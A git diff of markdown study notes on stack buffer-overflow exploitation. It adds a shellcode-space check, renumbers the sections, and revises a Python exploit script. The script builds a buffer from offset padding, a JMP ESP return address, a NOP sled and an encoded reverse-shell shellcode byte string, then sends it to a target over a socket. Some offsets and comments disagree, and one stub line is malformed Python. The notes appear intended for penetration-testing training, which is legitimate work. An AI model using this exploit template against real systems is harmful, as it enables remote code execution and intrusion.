@@ -57,7 +57,20 @@ EIP value: '42424242' = 'BBBB'
 
 ---
 
-### 5. CHECK FOR BAD CHARACTERS
+### 5. VERIFY SHELLCODE SPACE
+
+Reverse shell payload is typically ~350-500 bytes, so we want to check if there will be enough space for our payload immediately after EIP.
+
+We append this stub shellcode to the buffer:
+```python
+# 3000 = allocate ~400 bytes for shellcode
+# 2606 = len of offset
+# 4 = len of jmp_esp value in EIP register
+
+stub_shellcode = C*(3500 - 2606 - 4)
+```
+
+### 6. CHECK FOR BAD CHARACTERS
 
 Characters to test (256 in total):
 
@@ -90,7 +103,7 @@ Memory dump with chars payload -> see which bytes causes the truncation:
 
 ---
 
-### 6. FIND ADDRESS OF A JMP-ESP IN A .DLL
+### 7. FIND ADDRESS OF A JMP-ESP IN A .DLL
 
 **NOTE: ENSURE ADDRESS OF SELECTED .DLL WITH JMP-ESP DOES NOT CONTAIN ANY BAD CHARS**
 
@@ -113,7 +126,7 @@ Choose one of the pointers -> copy its address -> click on "Go to address in Dis
 ---
 
 
-### 7. GENERATE SHELLCODE
+### 8. GENERATE SHELLCODE
 
 **NOTE: ENSURE AT LEAST NULL \x00 CHAR IS EXCLUDED WHEN GENERATING EXPLOIT CODE**
 
@@ -162,15 +175,14 @@ shellcode = ("\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9\xbd\xc5\x06\x1f\x5e\xb1"
 "\x7a\x3b\xe0\x25\xf9\xc9\x99\xd1\xe1\xb8\x9c\x9e\xa5\x51\xed"
 "\x8f\x43\x55\x42\xaf\x41")
 
-junk = "A"*2369
+offset = "A"*2369
 jmp_esp = "\x43\x66\xfe\x52"
-offset = "C"*4
+stuff = "C"*4
 nops = "\x90"*16
-buffer = "C"*(3000-2369-4-16-351)
 
 end = "\r\n"
 
-buffer = cmd + junk + jmp_esp + offset + nops + shellcode + buffer + end
+buffer = cmd + offset + jmp_esp + stuff + nops + shellcode + end
 
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -184,7 +196,7 @@ except Exception as e:
 
 
 
-### 8. EXTRA
+### 9. EXTRA
 
 
 Running out of shell code space?
